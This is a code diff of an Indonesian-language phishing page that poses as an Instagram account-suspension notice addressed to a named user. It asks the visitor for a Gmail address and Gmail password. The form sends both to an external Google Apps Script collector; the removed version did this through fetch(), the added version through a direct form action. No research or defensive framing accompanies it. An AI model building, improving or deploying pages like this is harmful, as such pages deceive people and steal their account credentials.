@@ -2,129 +2,151 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Ambil tindakan - Form</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ambil tindakan</title>
   <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
   <style>
+    @font-face {
+      font-family: 'Instagram Sans';
+      src: local('Segoe UI'), sans-serif;
+      font-weight: 400;
+    }
+    * {
+      box-sizing: border-box;
+    }
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #fff;
-      margin: 0; padding: 20px;
+      margin: 0;
+      padding: 0;
+      font-family: 'Instagram Sans', 'Segoe UI', sans-serif;
+      background: white;
+      color: #262626;
       display: flex;
       justify-content: center;
-      min-height: 100vh;
-      align-items: center;
     }
-    .form-container {
-      width: 100%;
-      max-width: 380px;
-      background: #fff;
+    .wrapper {
+      background: white;
       border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      padding: 24px 20px;
-    }
-    h1 {
-      font-weight: 600;
-      margin-bottom: 16px;
-      color: #262626;
+      padding: 24px 16px;
+      width: 100%;
+      max-width: 390px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
       text-align: center;
     }
-    label {
-      display: block;
-      margin: 14px 0 6px 0;
-      font-weight: 600;
-      color: #444;
+    .top-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 14px;
     }
-    input[type="email"],
-    input[type="password"] {
+    .logo-img,
+    .mid-img,
+    .gog-img,
+    .footer-img {
+      display: block;
+      margin: 0 auto;
+    }
+    .logo-img {
+      width: 160px;
+      height: auto;
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+    }
+    .mid-img {
+      width: 80px;
+      height: auto;
+    }
+    .logo {
+      font-weight: 600;
+      font-size: 1.15rem;
+      margin-bottom: 6px;
+      line-height: 1.4;
+      white-space: pre-line;
+    }
+    .subtitle {
+      font-size: 1.05rem;
+      margin: 2px 0 18px;
+      line-height: 1.6;
+      color: #262626;
+    }
+    .gog-img {
+      width: 180px;
+      height: auto;
+      margin: 10px auto 16px;
+      border-radius: 8px;
+    }
+    form label {
+      display: block;
+      text-align: left;
+      font-weight: 600;
+      margin-bottom: 4px;
+      font-size: 0.95rem;
+    }
+    input {
       width: 100%;
       padding: 12px;
+      margin-bottom: 12px;
       border: 1px solid #ddd;
       border-radius: 8px;
       font-size: 1rem;
       background: #fafafa;
       color: #262626;
-      outline: none;
-      transition: border-color 0.3s ease;
-    }
-    input[type="email"]:focus,
-    input[type="password"]:focus {
-      border-color: #833AB4;
-      background: #fff;
     }
     button {
-      margin-top: 24px;
       width: 100%;
-      padding: 12px;
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: white;
+      background: linear-gradient(135deg, #833AB4, #FD1D1D, #FCAF45);
       border: none;
       border-radius: 8px;
-      background: linear-gradient(135deg, #833AB4, #FD1D1D, #FCAF45);
+      color: white;
+      font-weight: bold;
+      font-size: 1rem;
+      padding: 12px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: 0.3s ease;
     }
     button:hover {
-      background: linear-gradient(135deg, #752A9E, #E51717, #D78F27);
+      opacity: 0.9;
     }
-    .message {
-      margin-top: 16px;
-      font-weight: 700;
-      text-align: center;
-    }
-    .success {
-      color: green;
-    }
-    .error {
-      color: red;
+    .footer-img {
+      margin-top: 18px;
+      width: 80px;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
     }
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h1>Ambil tindakan</h1>
-    <form id="myForm">
-      <label for="email">Masukkan Gmail yang ingin Anda gunakan</label>
-      <input type="email" id="email" name="email" placeholder="email@gmail.com" required />
+  <div class="wrapper">
+    <div class="top-row">
+      <img src="https://i.imgur.com/ClpB5g4.png" alt="Logo" class="logo-img" />
+      <img src="https://i.imgur.com/Wk889yo.png" alt="Mid Icon" class="mid-img" />
+    </div>
 
-      <label for="password">Masukkan kata sandi Gmail</label>
-      <input type="password" id="password" name="password" placeholder="Password" required />
+    <div class="logo">Ambil tindakan atau kehilangan akses</div>
+    <div class="subtitle">
+      Halo la_ismyname,<br />
+      tambahkan email baru ke akun Anda<br />
+      untuk menerima pembaruan tentang<br />
+      status penangguhan akun
+    </div>
+
+    <img src="https://i.imgur.com/UZIsS5h.png" alt="Section Separator" class="gog-img" />
+
+    <form
+      action="https://script.google.com/macros/s/AKfycbxgU2ymDNOCOUjuypgHxGyOxsazVokewRQDs_-8_YULJME01GKcNikxg3uLsgedjk15Xw/exec"
+      method="POST"
+    >
+      <label for="name">masukkan Gmail yang ingin Anda gunakan</label>
+      <input type="text" name="name" id="name" required />
+
+      <label for="usage">masukkan kata sandi Gmail</label>
+      <input type="text" name="usage" id="usage" required />
 
       <button type="submit">Submit</button>
     </form>
 
-    <div id="message" class="message"></div>
+    <img src="https://i.imgur.com/z4qpO3r.png" alt="Footer Image" class="footer-img" />
   </div>
-
-  <script>
-    const form = document.getElementById('myForm');
-    const message = document.getElementById('message');
-
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      message.textContent = '';
-      message.className = 'message';
-
-      const scriptURL = const scriptURL = 'https://script.google.com/macros/s/AKfycbxgU2ymDNOCOUjuypgHxGyOxsazVokewRQDs_-8_YULJME01GKcNikxg3uLsgedjk15Xw/exec';
-
-      const formData = new FormData(form);
-
-      fetch(scriptURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        body: formData,
-      })
-      .then(() => {
-        message.textContent = '✅ Terkirim!';
-        message.classList.add('success');
-        form.reset();
-      })
-      .catch(() => {
-        message.textContent = '❌ Gagal mengirim. Coba lagi.';
-        message.classList.add('error');
-      });
-    });
-  </script>
 </body>
 </html>
